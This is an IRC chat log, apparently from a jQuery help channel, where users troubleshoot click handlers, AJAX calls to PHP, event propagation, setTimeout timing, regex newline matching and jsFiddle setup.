[00:01:15] <wkmanire> aLinux: No errors there.
[00:01:23] <wkmanire> wait
[00:01:24] <wkmanire> yes there are
[00:01:32] <wkmanire> aLinux: .click expects a function
[00:01:35] <sshaginyan> aLinux: click requires a function
[00:01:52] <sshaginyan> aLinux: As a parameter
[00:02:11] <wkmanire> aLinux: http://bpaste.net/show/16193/
[00:02:12] <wkmanire> like that
[00:02:13] <sshaginyan> aLinux: an anonymous function
[00:03:43] <Zeddy> does anyone know why my modal dialogs have a kinda laggy effect with the easing? http://ewo.fi/PublishedService?pageID=3&action=view&groupID=309&OpenGroups=309,303,317,null
[00:03:47] <Zeddy> try clicking a product
[00:04:11] <Zeddy> to my amazement it works best in IE9
[00:04:19] <Zeddy> but firefox and chrome is kinda laggy at opening it
[00:04:27] <Zeddy> the content itself is loaded using jQuery.load
[00:04:45] <wkmanire> Zeddy: Google Chrome 11.0.696.68 on Linux Mint 10 seems to work as expected.
[00:05:04] <aLinux>  still doesn't work, http://bpaste.net/show/16194/
[00:05:07] <aLinux> wkmanire: ^
[00:05:28] <wkmanire> aLinux: I'm sorry but "it doesn't work" is not going to cut it anymore.
[00:05:46] <wkmanire> aLinux: You need to make a jsFiddle for this issue and tell us what you expect and what isn't happening.
[00:07:30] <diegoviola> i'm doing an ajax call, how do i pass the value of a select/option element as the id to the server?
[00:08:02] <wkmanire> diegoviola: You can provide data to an ajax call with an object literal.
[00:08:22] <wkmanire> diegoviola: {"selectList": $('#mySelect').attr('checked')}
[00:08:23] <wkmanire> for example
[00:08:32] <wkmanire> well sorry, that was not quite right
[00:08:37] <wkmanire> but you get the idea.
[00:08:48] <diegoviola> thanks, makes sense
[00:09:37] <Zeddy> well i just realised i was using easing effects not included in jQuery by default
[00:09:54] <Zeddy> kinda funny that it still added some weird transition effect
[00:09:59] <Zeddy> but it was different for each browser :p
[00:10:05] <wkmanire> It was doing a slide for me.
[00:10:09] <wkmanire> Slide in from the right.
[00:10:19] <wkmanire> Didn't look that bad :)
[00:10:37] <aLinux>  the alert function works, but the color/border doesn't change, http://bpaste.net/show/16195/
[00:10:40] <aLinux> wkmanire: ^
[00:11:24] <wkmanire> aLinux: And what happens when you use $('td') instead of $('tr')?
[00:11:44] <jomofcw> Morning !
[00:11:50] <wkmanire> jomofcw: Howdy
[00:12:01] <jomofcw> wkmanire fne and you :) ?
[00:12:04] <jomofcw> fine
[00:12:17] <jomofcw> Just some typo because I should sleep more :x
[00:12:29] <wkmanire> jomofcw: Doin alright. Just fielding a few questions before I'm off to bed.
[00:12:45] <wkmanire> jomofcw: You wouldn't happen to be familiar with preventing DOM reflows would you?
[00:12:53] <aLinux> wkmanire: works like a charm, thanks
[00:12:59] <wkmanire> aLinux: Welcome
[00:12:59] <jomofcw> wkmanire if I could help :)
[00:13:22] <jomofcw> Hm, in which case ?
[00:13:32] <wkmanire> jomofcw: sshaginyan is having a bad DOM reflow issue.
[00:13:43] <wkmanire> sshaginyan: Can you paste your link again?
[00:13:46] <aLinux> bye
[00:13:47] <sshaginyan> sure
[00:13:54] <jomofcw> Does he have some pastie ?
[00:13:57] <sshaginyan> http://www.kgbcustoms.com/tracking
[00:13:58] <jomofcw> Yea or online code ^^
[00:14:06] <sshaginyan> jomofcw: http://www.kgbcustoms.com/tracking
[00:14:20] <wkmanire> check out the way the UI tab interface jitters as it is loading.
[00:14:28] <wkmanire> You might have to refresh a few times to catch it
[00:14:52] <Newb> couldn't use google to answer since its a special char question. what does ^ do in $('a[href^="http://"]')
[00:15:14] <sshaginyan> Newb: ^ indicates the beginning of
[00:15:26] <jomofcw> ?selector @ Newb
[00:15:27] <wkmanire> Newb: http://api.jquery.com/attribute-starts-with-selector/
[00:15:29] <Newb> thanks, looked everywher
[00:15:38] <jomofcw> ? selector @ Newb
[00:15:47] <jomofcw> Where is that damned bot :x ?
[00:15:57] <wkmanire> jomofcw: bot-t seems to be off having an oil bath.
[00:16:10] <jomofcw> I hope he will apreciate it :D
[00:16:32] <sshaginyan> jomofcw: Did you see the site?
[00:16:32] <wkmanire> he he
[00:16:45] <jomofcw> sshaginyan can't catch it on chrome, I try to refresh it more
[00:17:03] <sshaginyan> jomofcw: are you on unix?
[00:17:16] <jomofcw> sshaginyan nop win vista, that's not the better one :D
[00:17:22] <sshaginyan> lol try ie
[00:18:30] <jomofcw> sshaginyan what is exactly your reflow prob ?
[00:18:49] <jomofcw> Is that the fact that your tabs is initialy visible ?
[00:19:16] <wkmanire> jomofcw: You don't see how the contents of the tabs starts off in a big jumble that all pops into position as the tabs widget is applied?
[00:19:48] <sshaginyan> jomofcw: yes I think so
[00:20:06] <sshaginyan> jomofcw: Is there like a timer where everything loads up then displays
[00:20:06] <jomofcw> OK so the prob is not the reflow in fact but the loading time of the script and it apply
[00:20:13] <sshaginyan> yes
[00:20:34] <jomofcw> sshaginyan that could come from an heavy DOM structure, an heavy list of JS
[00:21:02] <sshaginyan> it is :)
[00:21:08] <jomofcw> For example I don't get it at all on FF
[00:21:12] <jomofcw> get it smaller on chrome
[00:21:20] <jomofcw> and get it bigger on IE
[00:21:27] <jomofcw> the slower one so
[00:21:39] <wkmanire> I'm off to bed folks.
[00:21:43] <wkmanire> Goodnight
[00:21:43] <sshaginyan> jomofcw: http://kgbcustoms.com/wp-content/themes/Protein/js/custom.js
[00:21:48] <jomofcw> So in fact did you try some hack like adding a display none with inline CSS ?
[00:21:51] <sshaginyan> wkmanire: Good night and thanks :)
[00:21:56] <wkmanire> no prob
[00:22:00] <jomofcw> good night wk !
[00:22:01] <jomofcw> ...
[00:22:02] <jomofcw> oups
[00:22:05] <sshaginyan> jomofcw: nope
[00:22:29] <jomofcw> You've got so many JS to load :/
[00:22:30] <sshaginyan> jomofcw: should I of have?
[00:22:35] <sshaginyan> I know
[00:22:41] <jomofcw> That's the prob here
[00:22:43] <sshaginyan> I downloaded a template
[00:22:55] <jomofcw> so the idea is to get something BEFORE each of this script will be load
[00:23:12] <jomofcw> The first way to do it better is to handle it with CSS
[00:23:34] <jomofcw> I think your site isn't here to work WITHOUT JS, right ?
[00:23:43] <sshaginyan> yes
[00:23:51] <jomofcw> So, put your JS at the bottom of body element instead of head element
[00:24:03] <jomofcw> then in your CSS file, hide your element
[00:24:27] <jomofcw> The JS at the bottom of body element is a reco of yahoo perf optimizer
[00:24:35] <sshaginyan> jomofcw: so put my js between my body and html tags?
[00:25:06] <jomofcw> That's always better, because the main JS files have to wait the DOM to be fully load, so don't need to be load itself BEFORE the DOM.
[00:25:21] <jomofcw> sshaginyan nop, just before the </body> tag
[00:25:29] <sshaginyan> I see
[00:25:30] <jomofcw> It should be IN the body tag, but at the end
[00:26:54] <sshaginyan> jomofcw: let me try
[00:28:43] <sshaginyan> jomofcw: Should I put all of my js their or only jquery-ui?
[00:31:27] <jomofcw> sshaginyan all that need or use the DOM
[00:32:10] <jomofcw> for example, if you've got any JS that could be apply without using the DOM (a refresh command, or a redirection), you don't need to move it at the bottom of thye body
[00:32:13] <sshaginyan> jomofcw: only js or css that is associated with the js?
[00:32:47] <jomofcw> but each other, like jQuery, jQuery UI, jQuery plugin for main one, document.write statement,...
[00:32:50] <jomofcw> don't move the CSS !
[00:32:56] <jomofcw> the CSS should stay in the head !
[00:32:58] <sshaginyan> k
[00:33:02] <jomofcw> Move only the JS
[00:33:15] <sshaginyan> k
[00:33:23] <jomofcw> We will work with CSS after to hide element so it should be load BEFORE the DOM and will be apply when the DOM will be draw
[00:33:54] <jomofcw> if you dunno which CSS use DOM or not, move all.
[00:37:40] <matter> Hey Guys what are the books and / or links for great ressources to learn Jquery, cheers
[00:39:31] <matter> I have the basic but I need to create a website projects like nikeskateboarding, I need to go to the next level !
[00:41:46] <jomofcw> matter you've a lot of it, just google it. I don't think there's a better one than the other.
[00:42:00] <jomofcw> matter and then we are here to help you discover it :)
[00:43:44] <matter> thanks jomofcw, I am working on a navigation type like http://www.nikeskateboarding.com/apparel#/filter/all I don't know how to start it
[00:45:12] <matter> I checked a link that wkmanire sent me don't know how to start it, is there any code or script I could use somewhere for a base
[00:45:26] <jomofcw> for the product nav, or the main nav ?
[00:45:55] <matter> for the product nav, when you click on an tee shirt for example
[00:45:55] <jomofcw> the product nav is not a harder one to do, just apply class to element and hide it according to what is click or not.
[00:46:19] <jomofcw> and the scroll effect could be done easily with the scrollTo plugin.
[00:47:00] <jomofcw> So here you need to learn how to use the scrollTo plugin, you need the Core method show(), hide() and click().
[00:47:35] <jomofcw> and the CSS selector to work with class matching, and probably with ID matching, and that's done !
[00:47:36] <matter> ok I am going to download this plugin, cool that is a good start !
[00:47:57] <jomofcw> the scrollTo plugin will only help you in what happen when I click on a product
[00:48:15] <jomofcw> Hm there's also a slideshow
[00:48:23] <jomofcw> you could find some plugin about that too
[00:48:27] <jomofcw> and combine it
[00:49:43] <jomofcw> Or a slider plugin
[00:50:31] <jomofcw> like this one : http://www.webinventif.fr/wslide-plugin/
[00:50:37] <jomofcw> it could be better one probably
[00:50:37] <matter> thanks , I have some stuff to work on !
[00:50:51] <matter> yes ?
[00:50:58] <jomofcw> because it's an old one, with no final release
[00:51:20] <jomofcw> search the plugin repository about slide and you should fine some advice :)
[00:51:27] <jomofcw> Now you've to work :p
[00:52:06] <matter> cheers jomofcw
[00:52:16] <jomofcw> You're wlecome :)
[00:53:59] <sean`> HIIII
[00:59:23] <jamov> man that jQuery 1.6.0 was a big fail. i'm glad they got 1.6.1 out soon enough.
[01:02:53] <jonee> good thing I am still on 1.5 lol
[01:04:44] <coldhead> i wonder if lenswipe ever got his shit sorted
[01:04:55] <coldhead> and i wonder if there will ever be a rainbow
[01:12:50] <fr0stbyte> what's that site call where ppl share code.. forstr.. forestr.. something like that
[01:13:41] <JackeyChan> I use jquery ui dialog and load a form using jquery from server, but page redirect when I add data by the form. So, How to prevent the redirect ???
[01:15:40] <sshaginyan> jomofcw: Okay I did it but nothing loads up http://www.kgbcustoms.com/tracking
[01:17:35] <xec> JackeyChan: im guessing you need to stop the submission with something like return false
[01:18:07] <xec> JackeyChan: and make your own submit handler, see http://api.jquery.com/submit/
[01:18:28] <JackeyChan> xec:OK, I am trying! Thanks!
[01:18:53] <xec> seeing as you load the form dynamically, you will have to bind the event only after the form is loaded
[01:20:01] <JackeyChan> yeah, i think so. but need more code for it. i also make the code clear
[01:22:45] <aLinux> hi
[01:22:52] <aLinux> for jquery ajax post, $.post("Display_Ajax.php",{username: temp1, password: temp2},function(prm){$("div.cls_display").html(prm);});
[01:23:22] <aLinux> is there any other alternative to $("..").html(..
[01:23:41] <aLinux> $("selector").html(..
[01:23:48] <aLinux> any alternative to .html ?
[01:25:34] <hrwath> aLinux, what's wrong with .html()?
[01:25:49] <aLinux> nothing wrong
[01:26:01] <aLinux> hrwath: curious , any other alternative ?
[01:26:08] <hrwath> not really
[01:26:23] <hrwath> besides pure JS
[01:26:27] <hrwath> innerHTML
[01:26:29] <hrwath> ;-)
[01:26:42] <aLinux> hrwath: .html() looks bad
[01:26:55] <aLinux> hrwath: it can be renamed as other
[01:27:19] <hrwath> I don't follow
[01:27:31] <hrwath> you don't like the function name?
[01:27:36] <hrwath> html?
[01:27:51] <aLinux> hrwath: yes, i don't like that function name
[01:28:13] <hrwath> aLinux, so... what can I say... get used to it ;-)
[01:29:18] <Klevre> I've a case where I can hide the element but not remove a class it has
[01:29:48] <hrwath> Klevre, code?
[01:31:54] <Klevre> http://klevre.nihplod.com/~klevre/ideas/
[01:32:04] <Klevre> hrwath: click on any li element and then save
[01:32:38] <hrwath> Klevre, nothing happens
[01:36:38] <Klevre> hrwath: nothing happens? O_o
[01:36:53] <hrwath> Klevre, nope, nothing
[01:36:59] <Klevre> try pressing a link there
[01:37:07] <aLinux> $.post(<?php Router::url(array('controller'=>'users','action'=>'time')); ?>, { name: "John", time: "2pm" } );
[01:37:11] <aLinux>  data will come from database not like that , { name: "John", time: "2pm" }
[01:37:29] <aLinux>  but how can i populate those data inside a division?
[01:37:40] <aLinux> without page reloading
[01:37:49] <aLinux> oops,
[01:38:17] <aLinux> $.post("test.php", { name: "John", time: "2pm" } );  like that
[01:38:23] <hrwath> Klevre, edit box comes up, but still nothing
[01:38:26] <hrwath> ;-)
[01:38:33] <aLinux> hrwath: ^
[01:38:48] <aLinux> data will come from reading database table
[01:39:27] <sean`> Klevre, you are not wrapping your php with quotes
[01:39:35] <sean`> so, if it spits out /users/time, it'll error uot
[01:39:47] <aLinux> how can jquery get data from database ?
[01:41:29] <aLinux> how can i get data from database and save it like this, { name: "one", time: "2pm" }
[01:41:41] <aLinux> "one" and "2pm" will come from database
[01:41:46] <Klevre> hrwath: Yeah edit box is supposed to appear, when "save" button is pressed the "editting" class on the li element is supposed to be removed
[01:42:27] <derknecht> how can i attach a function to a jQuery-wrapped object? i.e. $(obj).attr('test',function(){ ... }), but with this obj has no function test. thanks
[01:42:37] <Klevre> when an li element is clicked an "editting" class is added to it, I guess clicking on save doesn't work because that counts as a click on the li element as well
[01:42:42] <Klevre> No idea how to get around that
[01:44:10] <xec> aLinux: im guessing you want some sort of server-side script like php to do your database queries for you
[01:44:28] <Klevre> So basically I want a child element to be clicked without the parents click() function being triggered
[01:45:15] <xec> Klevre: call stopPropagation on your event, i suppose
[01:45:45] <aLinux> xec: ok, i will get data from database with php,
[01:46:05] <aLinux> xec: but how can i pass those value to jquery post?
[01:46:39] <aLinux> $.post("showvalues.php", { name: "John", time: "2pm" } );
[01:46:43] <xec> use $.get() or $.ajax() and point to the url of your php script
[01:46:53] <aLinux> xec: ok
[01:47:03] <aLinux> xec: but what about those data ?
[01:47:16] <aLinux> xec: { name: "john", time: "2pm" }
[01:47:21] <xec> thats from the database or from you script?
[01:47:50] <sector119> Hello. I'm going crazy with that http://dpaste.com/541946/, this line doesn't work, value isn't set $('#amount_change').val((-parseFloat($('td.amount_sum').html())).toFixed(2)); prev and next line does it job, but this one, not. how it can be? but if i exec it at console, it change the input value :/
[01:48:12] <aLinux> xec: i can get the value "john" and "2pm" with php but how can i pass these value for .post() function ?
[01:48:28] <aLinux> xec: how can i pass value fro .php script to jquery function ?
[01:48:51] <xec> aLinux: read up on http://api.jquery.com/jQuery.post/ --plenty of examples
[01:50:14] <aLinux> xec: jquery gets the value from an html tag's id, var lname     = $('#lname').attr('value');
[01:50:32] <thilanka> Hi
[01:50:33] <aLinux> xec: i'm talking about getting value from database to jquey function
[01:50:41] <Klevre> aLinux: You want JSON
[01:51:03] <thilanka> I have problem on using dialog in jjquery ui
[01:51:08] <Klevre> xec: Thanks, stopPropagation worked
[01:51:33] <xec> Klevre: yw :)
[01:51:33] <thilanka> I have posted it here http://stackoverflow.com/questions/5967904/how-to-popup-a-dialog-in-another-frame-using-jquery-ui
[01:52:06] <aLinux> Klevre: are you sure ?
[01:52:10] <thilanka> but still didn't get an answer
[01:52:25] <Klevre> aLinux: Yes, otherwise the response is not in the format you want it to be
[01:52:55] <xec> aLinux: { name: "john", time: "2pm" } <-- this IS json
[01:54:28] <thilanka> can some one help me on that
[01:54:47] <aLinux> Klevre: have you used that JSON before ?
[01:54:48] <thilanka> using dialogs within different frames
[01:55:08] <sean`> xec, that is hashmap
[01:55:25] <sean`> '{"name":"john", "time": "2pm"}' == json
[01:55:29] <sean`> ?json @ xec
[01:55:32] <Klevre> aLinux: http://php.net/manual/en/book.json.php
[01:55:41] <sean`> come on BOT
[01:56:02] <Klevre> sean`: but he said it regarding the jquery post example
[01:56:17] <sean`> Klevre, doesn't matter, json is json, hashmap is hashmap
[01:58:07] <xec> ye sorry, missed those quotes
[01:58:15] <aLinux> Klevre: can you post example ? how can i pass data from database to jquery function ?
[01:58:37] <aLinux> Klevre: can you post that example code
[01:58:40] <xec> aLinux: if you just read the page i linked, its all there
[02:01:04] <DarsVaeda> hi I try to set a button with jqueryui and then set it back after a time interval
[02:01:39] <DarsVaeda> so I did BUTTON.button(...do stuff...).delay(5000).button(...do another stuff...)
[02:02:06] <derknecht> why does $(obj).attr('test',function() { ... }) does not work to add the function test to the object obj?
[02:02:35] <aLinux> xec: did you understand the problem ?
[02:02:54] <aLinux> xec: i read that page
[02:03:39] <xec> aLinux: did you see the part about "Posts to the test.php page and gets contents which has been returned in json format"
[02:04:03] <FinalAngel> is there something to parse or display json like jsfiddle
[02:04:07] <pg57> Bonjour
[02:04:08] <Lampoon> que tal
[02:04:38] <pg57> Il y a des utilisateurs jQuery fran√ßais ici ?
[02:04:54] <aLinux> xec: yes,
[02:04:56] <Altreus> if I do obj.bind('click', some_function) this function is called /after/ all existing click handlers. Is there a way I can bind a handler to be called /first/?
[02:05:11] <aLinux> xec: question is pass the data from php file
[02:05:35] <aLinux> xec: pass the data to jquery function getting from php file
[02:13:51] <regnitup> need to figure out what to change to make both examples the same. http://jsbin.com/amota3/3/edit

[02:16:27] <Zerxer> [04:14] <Zerxer> need to dock that guy's pay
[02:16:31] <Zerxer> I like literally just said that too
[02:16:48] <regnitup>   /^H(.*)World$/mg   any idea on how to make .* include new lines in that regex?
[02:16:48] <Hopsy> hmm :(
[02:17:22] <Hopsy> regnitup: (*.?)
[02:18:00] <Zerxer> hm
[02:18:06] <Zerxer> is that right
[02:18:41] <regnitup> hmm, damn, any other ideas Hopsy?  http://jsbin.com/amota3/3/edit
[02:21:49] <Zerxer> regnitup: use [\s\S]
[02:22:23] <Zerxer> ([\s\S]*?)
[02:22:28] <trevor_reznick> hi, i'm working with the msdropdown (in order to use images inside the combos)
[02:22:54] <trevor_reznick> is there any way to change  images at runtime?
[02:23:18] <trevor_reznick> I mean, the image has the same name, but the content changes
[02:23:22] <regnitup> oh, sweet, thanks zerxer
[02:23:29] <regnitup> been at that awhile
[02:23:45] <Zerxer> yea basically the only, or best, way to catch any char in javascript
[02:24:07] <Zerxer> \s for whitespace and \S for non-whitespace
[02:24:18] <regnitup> cool, well, again, thanks. I swear I'll read a book on this before I ask for help again
[02:25:30] <Zerxer> #regex is the best place to ask regex questions also though
[02:32:45] <sean`> trevor_reznick, you can reload an image
[02:33:08] <trevor_reznick> how?
[02:33:17] <sean`> assign the src to it
[02:33:50] <sean`> var $img = $('img.reload'); $img.attr ('src', $img.attr ('src') + '?' + (new Date()).getTime ());
[02:33:52] <sean`> e.g.
[02:33:57] <sean`> force a reload
[02:34:38] <dismist> wont reload the cache
[02:34:46] <trevor_reznick> uhm.. i'm quite new in jquery..
[02:35:07] <trevor_reznick> what is "img.reload" ?
[02:35:34] <industrial> did you google it?
[02:36:02] <industrial> or rather, did you read the jquery documentation, intro, tutorial, whatever?
[02:36:19] <sean`> trevor_reznick, really?
[02:36:33] <industrial> start with that, not other people's time :)
[02:36:36] <sean`> trevor_reznick, don't you know $( .. here goes a selector .. )
[02:36:42] <trevor_reznick> yes yes
[02:36:47] <trevor_reznick> I know about selectors
[02:36:51] <sean`> guess you don't
[02:36:53] <industrial> so its a selector
[02:36:58] <industrial> img is a tag and .reload is a class
[02:36:59] <sean`> trevor_reznick, so, what's img.reload?
[02:37:00] <industrial> hurray!
[02:37:01] <sean`> omg
[02:37:03] <industrial> i did it for you
[02:37:05] <sean`> way to ruin it industrial
[02:37:16] <sean`> stupid companies always ><
[02:37:25] <industrial> (its a music genre)
[02:37:31] <sean`> so they say
[02:38:06] <sean`> sup Ely^
[02:38:12] <Ely^> hi sean`
[02:45:30] <trevor_reznick> my question is about msdropdown.. I don't know if i'm walking in a wrong way..
[02:46:05] <trevor_reznick> the url of the image, is stored in the "title" property of each optin in the select..
[02:47:06] <trevor_reznick> but if I change the image (but maintaining its name), the image doesn't change in the select option
[02:48:08] <shruggar>  #phpmyadmin
[02:53:49] <anger> Hi!
[02:54:05] <anger> I need some help with .parent()
[02:54:24] <anger> inputElement.parent('form').submit(function() { ...
[02:54:37] <anger> Should that code work?
[02:56:46] <anger> trying to attach submit-event on form
[02:56:53] <coldhead> it should work if inputElement is a jQuery object
[02:57:05] <coldhead> maybe you need $(inputElement).parents('form').etc
[02:57:16] <coldhead> or um try to use ?closest
[02:57:29] <coldhead> oh no bot-t
[02:57:43] <coldhead> closest() find the nearest ancestor
[02:58:55] <anger> var inputElement = $('.input');
[03:00:57] <coldhead> that'll do it
[03:01:02] <coldhead> good job!
[03:01:15] <TC> Ok so
[03:01:21] <TC> I want to delay by 5 seconds..
[03:01:33] <TC> but whenever I use delay() it seems to be fast.
[03:01:36] <TC> even when I'm doing 5000
[03:02:17] <TC> either that, or it's not delaying at all..
[03:02:18] <TC> $("#wallComments").delay(1000).load("includes/php/modules/wall/loadComments.php");
[03:02:22] <coldhead> it depends what you're doing
[03:02:25] <anger> ok, got it working like this: inputElement.parents('form').each(function() { $(this).submit(function() { .. }); });
[03:02:26] <coldhead> you can't delay that
[03:02:34] <coldhead> delay is for animations, mostly
[03:02:42] <coldhead> you want to use setTimeout(), TC
[03:03:48] <anger> ok, and that .each() is not needed...
[03:07:02] <TC> thanks, that works.
[03:13:08] <TC> hmmm
[03:13:18] <TC> I went another method as it would work better for pagination
[03:13:19] <TC> $.ajax({ url: "includes/php/modules/wall/loadComments.php", success: function(html) { setTimeout('$("#wallComments").html(html)', 1000); } });
[03:13:21] <TC> that's not working?
[03:13:42] <opalepatrick> having trouble sorting out a multi dimensional json response as per http://jsfiddle.net/QbYnc/1/
[03:13:58] <opalepatrick> data function towards bottom
[03:14:38] <opalepatrick> getting Uncaught ReferenceError: json is not defined in Chrome but not working elsewhere as well
[03:14:40] <TC> oh, removed the quotes and it worke.
[03:14:42] <coldhead> i can't see why that isn't working, TC
[03:15:00] <coldhead> i suggest trying a console.log() inside the success fn and one inside the setTimeout fn and see if/when they are called
[03:15:31] <TC> hm, or it's not working. xD
[03:15:33] <TC> okay i'll try that
[03:15:46] <TC> it loads, just doesn't... have the delay kind of thing
[03:16:00] <quicksilver> TC: you're calling it instantly that's why
[03:16:18] <quicksilver> setTimeout(function(){ $('#wallComments........ },1000)
[03:16:20] <quicksilver> is what you need.
[03:16:46] <quicksilver> setTimeout(foo(),1000) calls foo *now* and passes the result to setTimeout
[03:17:03] <quicksilver> setTimeout(function() { foo(); },1000) passes a function which will be used to call foo later.
[03:17:13] <coldhead> goddess bless you quicksilver
[03:17:16] <quicksilver> setTimeout(foo,1000) also works if you happen to have a named function, of course.
[03:17:17] <TC> ohh yeah that works.
[03:17:26] <TC> what about this console.log then, I've never used it before?
[03:17:26] <coldhead> i should retire drunkenly and not try to "help"
[03:17:27] <quicksilver> (but your example isn't a named function)
[03:17:39] <quicksilver> coldhead: drink more and regain the sweet spot of clarity!
[03:17:48] <coldhead> roger wilco!
[03:18:54] <DarsVaeda> hi, i do this in jquery-ui, the button icon is set but the effect is not showing up? http://codepaste.net/uo2v4q
[03:19:35] <sean`> jsfiddle.net DarsVaeda
[03:20:02] <DarsVaeda> what's dat?
[03:20:10] <TC> You paste your JS on it..
[03:20:14] <TC> and html
[03:20:16] <TC> and css.
[03:20:17] <sean`> you can create working examples of js, html and css
[03:20:27] <sean`> using common libraries or add your own resources
[03:20:54] <DarsVaeda> oh okay...BUT as the button command works, I guess this is not to much about the html, not?
[03:21:14] <sean`> no, but we can alter it live there
[03:21:21] <sean`> so we can test stuff
[03:21:30] <sean`> and help you fix it
[03:24:34] <DarsVaeda> does not support jquery-ui, or does it?
[03:25:01] <TC> yes it does
[03:25:02] <TC> and mootools
[03:25:19] <DarsVaeda> how do i set jquery-ui there? http://jsfiddle.net/r8x7m/1/
[03:25:19] <TC> if you look at the side on the left, it has the framework selections
[03:25:59] <TC> uhm
[03:26:14] <TC> oh
[03:26:18] <TC> jQuery-ui is different
[03:26:27] <DarsVaeda> AHA! :P
[03:26:36] <sean`> note, it's only for jsnot for css
[03:26:40] <sean`> you need to add the css resource itself
[03:29:31] <DarsVaeda> i dont know I cant get it to work
[03:29:37] <DarsVaeda> and now i have two problems
[03:29:49] <DarsVaeda> I actually just wanted to have my original problem solved ^^
[03:29:53] <sean`> learning to work with jsfiddle is a major +
[03:29:54] <Trisox> anyone an idea how to retrieve this to values in to separeated input boxes? <a href="#" onclick="UpdateSortOrder(['isbn','asc'])">Click for rainbows</a>
[03:30:01] <sean`> it'll help you solve problems easier in the future
[03:30:07] <Trisox> hey sean`
[03:30:10] <jomofcw> is there a way to remove an element from a set of element ?
[03:30:14] <sean`> and let's be honest, how hard is it to set up something in jsfiddle
[03:30:24] <Trisox> N.o.t.
[03:30:37] <sean`> jomofcw, slice
[03:30:47] <jomofcw> sean` hi ^^ ! Ok thanks !
[03:30:48] <TC> function doEffect(button) {
[03:30:53] <TC> you need to call that function
[03:30:56] <TC> which you aren't doin first
[03:31:19] <TC> http://jsfiddle.net/r8x7m/13/ I got the jQuery UI resources added.. (look at resources, on the left side)
[03:31:28] <jomofcw> sean` is there the same thing, giving the element to remove as parameter ?
[03:31:43] <sean`> jomofcw, you can use index
[03:32:39] <sean`> jomofcw, don't forget, you can use .not and .filter
[03:32:39] <jomofcw> OK !
[03:33:44] <sean`> jomofcw, http://jsfiddle.net/fgdRc/
[03:34:04] <jomofcw> Thanks sean` ^^
[03:36:00] <Trisox> http://jsfiddle.net/Trisox/Ygu5q/1/ any one an idea?
[03:37:04] <JackeyChan> var element = $("div"); But the div has class event handler, does element object remember the handler ?
[03:37:12] <DarsVaeda> TC: you can actually select jquery UI by choosing Jquery (edge)
[03:37:20] <DarsVaeda> it still does not work though ^^
[03:53:20] <Birliban> hi, why do i get the whole string instead of the first match? "check testvalue".replace(/check (testvalue)/, "$1") -> gives me "check testvalue" instead of "testvalue"
[03:54:00] <quicksilver> that's a javascript question not a jquery one :-/
[03:55:06] <Birliban> quicksilver, i know... but i use javascript with in jquery, don't you? ;-)
[03:56:01] <quicksilver> I do yes, but this may not be hte channel you're most likely to get an answer in.
[03:56:31] <quicksilver> if I needed to know how javascript REs handle capturing groups I'd have to find my JS reference book because it's not something I do often in JS.
[03:57:39] <quicksilver> Birliban: having said that, it works for me.
[03:57:49] <quicksilver> (that is, it returns 'testvalue')
[03:57:56] <Birliban> quicksilver, right, this book is in office, i'm at home now... so ok, i'll go and check the js channel...
[03:58:09] <quicksilver> "check testvalue".replace(/check (testvalue)/, "$1")
[03:58:10] <quicksilver> "testvalue"
[03:58:17] <quicksilver> ^^ from webkit's JS console
[03:59:41] <Birliban> quicksilver, yes, thats funny, worked for me too now, but i had a little more complex string... hmm, have to evaluate this. thx.
[04:05:15] <Repox> Hi... If I do this $(".mySelection") - how can I get the element type (wether it's a A, DIV and so on)?
[04:05:39] <rasca> I'm having a little of cross browser problems.. I'm creating a new form element, cloning some elements from another form and appending them to the new form, and then submitting the newform with .submit(). In chromium it's working flawlessly but in firefox there's just nothing happening.. any ideas?
[04:06:42] <rasca> Repox: $(".mySelection").get(0).tagName
[04:08:24] <Repox> rasca: Thanks
[04:12:17] <glen1> hey
[04:14:19] <glen1> Im having problems with the jquery bbq plugin on IE8, it says "object doesnt support this property or method" on var url = $.param.fragment();
[04:15:04] <glen1> Is there any known problems with ie8 or is it just this way in general
[04:16:19] <SoulRaven> hi
[04:16:34] <SoulRaven> is it posibile ussing query to extract some data from a external site?
[04:16:52] <SoulRaven> i want to fetch a table and a image from a external site
[04:17:09] <SoulRaven> and display in a popup window when is needed
[04:17:28] <Trisox> how would you guys do this ? http://jsfiddle.net/Trisox/Ygu5q/1/
[04:19:08] <coldhead> no i
[04:19:15] <coldhead> wat
[04:19:26] <Trisox> coldhead
[04:21:35] <mazzachre> I have an input field that is used to create an entry in a database, but I want to check while someone is using it, if the entry is already there... How to do that? Not autocomplete, rather the opposite...
[04:22:26] <sean`> mazzachre, same principle
[04:22:49] <sean`> Instead of showing your result, you flag it either valid or invalid if a result is available
[04:22:57] <Trisox> sean`: any idea's?
[04:22:59] <sean`> this is, if you want to do it on keypress
[04:23:15] <sean`> mazzachre, if you want to do it with a button, it's far more easier
[04:23:18] <coldhead> Trisox: did you use onClick before?
[04:23:19] <sean`> Trisox, I don't get what you're trying to do
[04:23:36] <Trisox> get the values from the onclick array in to the input fields
[04:24:05] <Trisox> onclick move isbn to #order and asc in to #sort
[04:24:06] <mazzachre> sean`: Ya, that was what I though... Perhaps I should add a button to check and show...
[04:24:21] <sean`> Trisox, <input#sort> should contain: isbn, asc ?
[04:24:48] <Trisox> no input#sort> =  asc input#sort>order = isbn
[04:24:57] <Trisox> uhh
[04:25:06] <Trisox> no input#sort> =  asc input#order> = isbn
[04:25:07] <Trisox> that
[04:25:09] <Trisox> ;)
[04:25:34] <dr0id> sean`

[04:48:43] <fmerges> hi
[04:49:55] <fmerges> when i load the page with chrome everything is working and fine, but when i load with ff or konqueror, even a simple selector like $('#search_form input') returns back an empty object, any hint?
[04:50:15] <sean`> fmerges, are you using the domready event?
[04:51:12] <fmerges> sean`: $(document).ready() ?
[04:51:48] <sean`> fmerges, is that the dom ready event?
[04:52:40] <fmerges> sean`: i load the page, and just use firebug or the dev tools of chrome for inspecting the DOM, and that is not working from FF
[04:52:49] <sean`> omg
[04:52:52] <sean`> it's a simple question
[04:52:57] <sean`> with a yes or no answer
[04:55:52] <Trisox> :D
[04:57:13] <Trisox> @ sean` maybe
[04:57:19] <Trisox> :D
[05:06:41] <aLinux> can i ask question?
[05:06:50] <blk_panther> can I use var x = value.y ? value.y : 'string'; - does this have other possible drawbacks than setting to string if value.y = 0?
[05:07:01] <blk_panther> aLinux: don't ask to ask, just ask!
[05:09:54] <aLinux> i want to pass data from php to jquery, is there any way to do this?
[05:10:06] <aLinux> any built in way from jquery
[05:10:50] <skamikaze> ?ajax @ aLinux
[05:11:11] <skamikaze> aLinux: http://api.jquery.com/category/ajax/
